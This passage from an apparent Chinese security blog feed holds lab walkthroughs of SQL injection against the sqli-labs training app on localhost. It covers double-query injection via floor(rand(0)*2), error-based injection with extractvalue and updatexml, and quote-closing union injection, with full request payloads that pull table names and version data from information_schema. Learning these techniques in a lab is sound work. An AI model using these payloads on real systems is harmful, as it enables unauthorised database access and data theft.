&lt;p&gt;由前文可知，floor(rand(0)*2) 的值是011011011…….的规律。&lt;/p&gt;
&lt;p&gt;取第一条记录，取到的值是0【&lt;code&gt;第一次计算&lt;/code&gt;】。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;判断&lt;/code&gt;：虚表中发现0这个键值并不存在，那么，floor(rand(0)*2)会被再次计算一次&lt;/p&gt;
&lt;p&gt;结果取到了1【&lt;code&gt;第二次计算&lt;/code&gt;】。将key=1插入虚表，这是第一条记录查询完毕。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930231052670.png&#34; alt=&#34;image-20220930231052670&#34;&gt;&lt;/p&gt;
&lt;p&gt;查询第二次记录，再次计算floor(rand(0)*2)，发现结果为1【&lt;code&gt;第三次计算&lt;/code&gt;】。&lt;/p&gt;
&lt;p&gt;查询虚表，发现1这个键值已经存在，因此floor(rand(0)*2) 不会再次计算，直接count(1)加1，第二条记录查询完毕。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930231458853.png&#34; alt=&#34;image-20220930231458853&#34;&gt;&lt;/p&gt;
&lt;p&gt;查询第三条记录，再次计算floor(rand(0)*2)，取值为0【&lt;code&gt;第四次计算&lt;/code&gt;】，查询虚表，发现键值没有0，则再次计算floor，取值为1【&lt;code&gt;第五次计算&lt;/code&gt;】&lt;/p&gt;
&lt;p&gt;而此时，1这个主键已经存在于虚表中，新计算的值也为1【&lt;code&gt;第五次计算&lt;/code&gt;】，&lt;strong&gt;由于插入的key主键值必须唯一&lt;/strong&gt;，新计算的1和主键1重复，因此插入的时候直接报错。&lt;/p&gt;
&lt;h3 id=&#34;灵魂拷问三：选择rand-0-而非rand-的原因&#34;&gt;&lt;a href=&#34;#灵魂拷问三：选择rand-0-而非rand-的原因&#34; class=&#34;headerlink&#34; title=&#34;灵魂拷问三：选择rand(0)而非rand()的原因&#34;&gt;&lt;/a&gt;灵魂拷问三：选择rand(0)而非rand()的原因&lt;/h3&gt;&lt;p&gt;简而言之，group by插入进&lt;key，count(1)&gt;虚表的前提是——&lt;code&gt;当前的记录在虚表中不存在&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;白话文解释：当前的记录由于011011011这特殊规律导致0这个记录的在表中不存在，计算时总是被取值成1插入虚表，第一次还能插进来，但在第二次新插入进来的1又存在于虚表中，所以就报“重复条目“的错了。&lt;/p&gt;
&lt;p&gt;选择&lt;code&gt;rand(0)x2&lt;/code&gt;是&lt;strong&gt;必会报错&lt;/strong&gt;，而&lt;code&gt;rand()x2&lt;/code&gt;就不一定了【可能报错、可能不报错】。&lt;/p&gt;
&lt;p&gt;因为通过上文解释，如果不是011011这个特殊规律，0和1是都可以进到虚表中，如果都能进来，那就不会报错。&lt;/p&gt;
&lt;p&gt;因此，100%报错须要count()，rand(0)*2、group by，三者缺一不可。&lt;/p&gt;
&lt;h3 id=&#34;双注入走起&#34;&gt;&lt;a href=&#34;#双注入走起&#34; class=&#34;headerlink&#34; title=&#34;双注入走起&#34;&gt;&lt;/a&gt;双注入走起&lt;/h3&gt;&lt;p&gt;首先使用concat组合字符串&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), version()) %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001000024436.png&#34; alt=&#34;image-20221001000024436&#34;&gt;&lt;/p&gt;
&lt;p&gt;将version处替换成我们想要的select语句【注意，这里只能使用limit 0,1来进行输出爆破，group_concat会爆出数据库信息失败】&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), (select table_name from information_schema.tables where table_schema=database() limit 0,1)) %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001000515293.png&#34; alt=&#34;image-20221001000515293&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，双注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</guid>
            <title>报错注入</title>
            <link>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Thu, 29 Sep 2022 23:57:38 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL-注入之报错注入&#34;&gt;&lt;a href=&#34;#SQL-注入之报错注入&#34; class=&#34;headerlink&#34; title=&#34;SQL 注入之报错注入&#34;&gt;&lt;/a&gt;SQL 注入之报错注入&lt;/h1&gt;&lt;p&gt;本篇使用报错注入。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：报错函数的使用中，第二个参数如果来自于查询语句，都是&lt;strong&gt;需要用小括号包裹起来的&lt;/strong&gt;。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#使用 extractvalue(1, (select xxx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1, extractvalue(1, concat(&amp;#x27;%&amp;#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#使用 updatexml(1, (select xxx), 1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1, updatexml(1, concat(&amp;#x27;%&amp;#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;注入步骤&#34;&gt;&lt;a href=&#34;#注入步骤&#34; class=&#34;headerlink&#34; title=&#34;注入步骤&#34;&gt;&lt;/a&gt;注入步骤&lt;/h2&gt;&lt;h3 id=&#34;设置代理&#34;&gt;&lt;a href=&#34;#设置代理&#34; class=&#34;headerlink&#34; title=&#34;设置代理&#34;&gt;&lt;/a&gt;设置代理&lt;/h3&gt;&lt;p&gt;还是Less-11，我们挂上&lt;strong&gt;BurpSuit&lt;/strong&gt;代理，然后&lt;strong&gt;Send To Reapeater&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929231322659.png&#34; alt=&#34;image-20220929231322659&#34;&gt;&lt;/p&gt;
&lt;p&gt;报错注入常使用的函数如下：&lt;/p&gt;
&lt;p&gt;①&lt;strong&gt;extractvalue&lt;/strong&gt;():从目标XML中返回包含所查询值的字符串。&lt;/p&gt;
&lt;p&gt;例子：extractvalue(XML_document, XPath_string);&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第一个参数&lt;/code&gt;：XML_documentshi String格式，为XML文档对象的名称。&lt;strong&gt;在报错注入中可以随意指定，比如1即可。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第二个参数&lt;/code&gt;：XPath_string (Xpath格式的字符串)。&lt;strong&gt;在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;concat()：返回结果为连接参数产生的字符串。&lt;/p&gt;
&lt;p&gt;②&lt;strong&gt;updatexml&lt;/strong&gt;(): 更新XML信息&lt;/p&gt;
&lt;p&gt;例子：updatexml(XML_document, XPath_string, new_value); &lt;/p&gt;
&lt;p&gt;&lt;code&gt;第一个参数&lt;/code&gt;：XML_document是String格式，为XML文档对象的名称。&lt;strong&gt;在报错注入中可以随意指定，比如1即可。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第二个参数&lt;/code&gt;：XPath_string (XPATH格式的字符串)。&lt;strong&gt;在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第三个参数&lt;/code&gt;：new_value, String格式， 替换查找到的符合条件的数据。&lt;strong&gt;在报错注入中可以随意指定，比如1即可。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;确定注入类型和列数&#34;&gt;&lt;a href=&#34;#确定注入类型和列数&#34; class=&#34;headerlink&#34; title=&#34;确定注入类型和列数&#34;&gt;&lt;/a&gt;确定注入类型和列数&lt;/h3&gt;&lt;p&gt;通过单引号注入和order by n来&lt;strong&gt;确定注入类型&lt;/strong&gt;和&lt;strong&gt;查询列数&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929232026560.png&#34; alt=&#34;image-20220929232026560&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;使用指定报错函数&#34;&gt;&lt;a href=&#34;#使用指定报错函数&#34; class=&#34;headerlink&#34; title=&#34;使用指定报错函数&#34;&gt;&lt;/a&gt;使用指定报错函数&lt;/h3&gt;&lt;p&gt;那么我们就可构造：&lt;/p&gt;
&lt;p&gt;extractvalue(1, XPATH_string)，其中XPATH_string为(select version())&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1, extractvalue(1, (select version())) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929233031785.png&#34; alt=&#34;image-20220929233031785&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到版本号被截断，信息不全。我们尝试调concat()函数使用0x7e字符拼接：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1, extractvalue(1, concat(0x7e, (select version()))) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929233343167.png&#34; alt=&#34;image-20220929233343167&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里分割字符串可以换成%，分割字符串的选择比较看运气，有时候后台会校验，所以多用ASCII来表示。&lt;strong&gt;比如波浪线的ASCII为0x7e&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929233647634.png&#34; alt=&#34;image-20220929233647634&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;泄露数据库信息&#34;&gt;&lt;a href=&#34;#泄露数据库信息&#34; class=&#34;headerlink&#34; title=&#34;泄露数据库信息&#34;&gt;&lt;/a&gt;泄露数据库信息&lt;/h3&gt;&lt;p&gt;准备泄露数据库的表名&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1, extractvalue(1, concat(&amp;#x27;%&amp;#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是报了错，&lt;code&gt;Subquery returns more than 1 row&lt;/code&gt;，说明最后查询的select的列数超过了一列。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929233914430.png&#34; alt=&#34;image-20220929233914430&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们需要&lt;strong&gt;使用limit 0,1限制一列输出&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929234118900.png&#34; alt=&#34;image-20220929234118900&#34;&gt;&lt;/p&gt;
&lt;p&gt;或者&lt;strong&gt;使用group_concat拼接成一列&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929234238245.png&#34; alt=&#34;image-20220929234238245&#34;&gt;&lt;/p&gt;
&lt;p&gt;同理，也使用updatexml进行报错注入&lt;/p&gt;
&lt;p&gt;构造时，因为我们关键是为了调用&lt;code&gt;updatexml&lt;/code&gt;函数和使用&lt;code&gt;第二个参数&lt;/code&gt;进行内容输出，因此&lt;strong&gt;第一个参数&lt;/strong&gt;和&lt;strong&gt;第三个参数&lt;/strong&gt;都是&lt;strong&gt;“无用”&lt;/strong&gt;的，设置成1即可。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; union select 1, updatexml(1, concat(&amp;#x27;&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929234443551.png&#34; alt=&#34;image-20220929234443551&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，报错注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid>
            <title>字符型注入</title>
            <link>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Thu, 29 Sep 2022 21:54:18 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL-注入之字符型注入&#34;&gt;&lt;a href=&#34;#SQL-注入之字符型注入&#34; class=&#34;headerlink&#34; title=&#34;SQL 注入之字符型注入&#34;&gt;&lt;/a&gt;SQL 注入之字符型注入&lt;/h1&gt;&lt;p&gt;本篇使用字符型注入。&lt;/p&gt;
&lt;h2 id=&#34;注入步骤-单引号注入&#34;&gt;&lt;a href=&#34;#注入步骤-单引号注入&#34; class=&#34;headerlink&#34; title=&#34;注入步骤(单引号注入)&#34;&gt;&lt;/a&gt;注入步骤(单引号注入)&lt;/h2&gt;&lt;p&gt;由于Less-1从请求上看到是GET型，所以礼节性地输入个id=1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929215708949.png&#34; alt=&#34;image-20220929215708949&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;尝试注入类型&#34;&gt;&lt;a href=&#34;#尝试注入类型&#34; class=&#34;headerlink&#34; title=&#34;尝试注入类型&#34;&gt;&lt;/a&gt;尝试注入类型&lt;/h3&gt;&lt;p&gt;输入1’  来看看是否报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929215814839.png&#34; alt=&#34;image-20220929215814839&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入22’  来看看是否报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929215843779.png&#34; alt=&#34;image-20220929215843779&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么，&lt;code&gt;&amp;#39;22&amp;#39;&amp;#39; LIMIT 0,1&lt;/code&gt;中，’22’’  外面包裹的两个单引号是查询时带上的，需要我们去闭合。&lt;/p&gt;
&lt;h3 id=&#34;确定注入类型&#34;&gt;&lt;a href=&#34;#确定注入类型&#34; class=&#34;headerlink&#34; title=&#34;确定注入类型&#34;&gt;&lt;/a&gt;确定注入类型&lt;/h3&gt;&lt;p&gt;闭合单引号，需要在输入中添加一个单引号之后，使用行注释符注释后面的代码，常用的有: #、%23、—+&lt;/p&gt;
&lt;p&gt;那么，我们尝试一下#号&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;不行，会报错，可能后台过滤了#号。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929220358319.png&#34; alt=&#34;image-20220929220358319&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试%23也一样，就不再贴图了。&lt;/p&gt;
&lt;p&gt;我们最后尝试—+，成功。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; --+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929220326957.png&#34; alt=&#34;image-20220929220326957&#34;&gt;&lt;/p&gt;
&lt;p&gt;由此，可以确定此题注入类型为字符型注入的&lt;strong&gt;单引号注入&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&#34;确定列数&#34;&gt;&lt;a href=&#34;#确定列数&#34; class=&#34;headerlink&#34; title=&#34;确定列数&#34;&gt;&lt;/a&gt;确定列数&lt;/h3&gt;&lt;p&gt;使用order by n 来确定有多少列。&lt;strong&gt;order by n&lt;/strong&gt;会以当前表中的“&lt;strong&gt;第n列&lt;/strong&gt;”进行排序，如果&lt;strong&gt;第n列不存在&lt;/strong&gt;，则会抛出&lt;code&gt;Unknown column &amp;#39;n&amp;#39;&lt;/code&gt;的异常。&lt;/p&gt;
&lt;p&gt;4列？&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; order by 4--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929220842238.png&#34; alt=&#34;image-20220929220842238&#34;&gt;&lt;/p&gt;
&lt;p&gt;3列？&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; order by 3--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929220533059.png&#34; alt=&#34;image-20220929220533059&#34;&gt;&lt;/p&gt;
&lt;p&gt;不报错，则说明&lt;code&gt;有3列&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&#34;构造联合查询泄露数据库信息&#34;&gt;&lt;a href=&#34;#构造联合查询泄露数据库信息&#34; class=&#34;headerlink&#34; title=&#34;构造联合查询泄露数据库信息&#34;&gt;&lt;/a&gt;构造联合查询泄露数据库信息&lt;/h3&gt;&lt;p&gt;这回我们使用&lt;code&gt;and 0&lt;/code&gt;来构造对于id的查询为假的条件&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; and 0 union select 1, group_concat(table_name), database() from information_schema.tables where table_schema = database() --+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929221156300.png&#34; alt=&#34;image-20220929221156300&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;注入步骤-双引号注入&#34;&gt;&lt;a href=&#34;#注入步骤-双引号注入&#34; class=&#34;headerlink&#34; title=&#34;注入步骤(双引号注入)&#34;&gt;&lt;/a&gt;注入步骤(双引号注入)&lt;/h2&gt;&lt;p&gt;Less-4是一道双引号注入的题目。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929221450837.png&#34; alt=&#34;image-20220929221450837&#34;&gt;&lt;/p&gt;
&lt;p&gt;由于查看发现是GET请求，因此礼节性地输入id=1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929221657747.png&#34; alt=&#34;image-20220929221657747&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;尝试注入类型-1&#34;&gt;&lt;a href=&#34;#尝试注入类型-1&#34; class=&#34;headerlink&#34; title=&#34;尝试注入类型&#34;&gt;&lt;/a&gt;尝试注入类型&lt;/h3&gt;&lt;p&gt;输入1’  来看看是否报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929221831821.png&#34; alt=&#34;image-20220929221831821&#34;&gt;&lt;/p&gt;
&lt;p&gt;不报错，怀疑存在双引号注入。&lt;/p&gt;
&lt;p&gt;输入1“  来看看是否报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929221918225.png&#34; alt=&#34;image-20220929221918225&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么，&lt;code&gt;&amp;quot;1&amp;quot;&amp;quot;) LIMIT 0,1&lt;/code&gt;中，”1””)  外面包裹的【两个双引号 + 一个小括号】是查询时带上的，需要我们去闭合。&lt;/p&gt;
&lt;h3 id=&#34;确定注入类型-1&#34;&gt;&lt;a href=&#34;#确定注入类型-1&#34; class=&#34;headerlink&#34; title=&#34;确定注入类型&#34;&gt;&lt;/a&gt;确定注入类型&lt;/h3&gt;&lt;p&gt;我们尝试：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-4&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;quot;) --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功不报错。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929222215596.png&#34; alt=&#34;image-20220929222215596&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后就可以愉快地&lt;strong&gt;确定列数&lt;/strong&gt; + 使用&lt;strong&gt;联合查询泄露数据库信息&lt;/strong&gt;了。&lt;/p&gt;
&lt;p&gt;小练习&lt;/p&gt;
